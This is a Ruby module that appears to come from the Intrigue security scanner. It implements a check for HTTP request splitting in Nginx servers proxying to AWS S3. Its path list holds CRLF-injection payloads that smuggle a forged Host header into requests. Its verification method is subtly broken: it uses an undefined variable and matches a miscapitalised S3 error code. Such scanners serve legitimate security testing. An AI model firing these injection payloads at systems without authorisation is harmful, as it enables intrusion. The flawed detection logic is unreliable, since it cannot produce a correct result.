module Intrigue
module Task
class AwsS3BucketHttpSplitting < BaseTask
  
  def self.metadata
    {
      :name => "vuln/aws_s3_bucket_http_splitting",
      :pretty_name => "Vuln Check - AWS S3 Bucket HTTP Splitting",
      :authors => ["Anas Ben Salah"],
      :description => "Exploiting Http splitting vulnerability in Nginx server using S3 bucket",
      :references => [
        "https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/"
      ],
      :type => "vuln_check",
      :passive => false,
      :allowed_types => ["Uri"],
      :example_entities => [ {"type" => "Uri", "details" => {"name" => "http://intrigue.io"}} ],
      :allowed_options => [  ],
      :created_types => []
    }
  end

  def verify_vuln(res)

    if  response.code.to_i == 404 && response.body_utf8 =~  /<BucketName>non-existing-bucket1<\/BucketName>/ && response.body_utf8 =~ /<Code>NosuchBucket<\/Code>/
      return true
    end
    false
  end


  ## Default method, subclasses must override this
  def run
    super
    
    require_enrichment
    uri = _get_entity_name

    # check if nginx is present
    runs_nginx = false 
    fp = _get_entity_detail("fingerprint")
    fp.each do |f|
      if f["vendor"] == "Nginx" && f["product"] == "Nginx"
        runs_nginx = true
        break
      end
    end

    return unless runs_nginx == true 


    path_list=["/docs/%20HTTP/1.1%0d%0aHost:non-existing-bucket1%0d%0a%0d%0a",
                "/media/%20HTTP/1.1%0d%0aHost:non-existing-bucket1%0d%0a%0d%0a",
                "/images/%20HTTP/1.1%0d%0aHost:non-existing-bucket1%0d%0a%0d%0a",
                "/sitemap/%20HTTP/1.1%0d%0aHost:non-existing-bucket1%0d%0a%0d%0a"
              ]


    # endpoints
    path_list.each do |path|
      endpoint = "#{uri}#{path}"
      # request
      response = http_request :get, endpoint
      is_vuln = verify_vuln(response)

      # log if vulnerable
      if is_vuln
        _log "Vulnerable!"
        _create_linked_issue "aws_s3_bucket_http_splitting"
      else
      _log "Not Vulnerable!"
      end
    end 
  end

end
end
end
  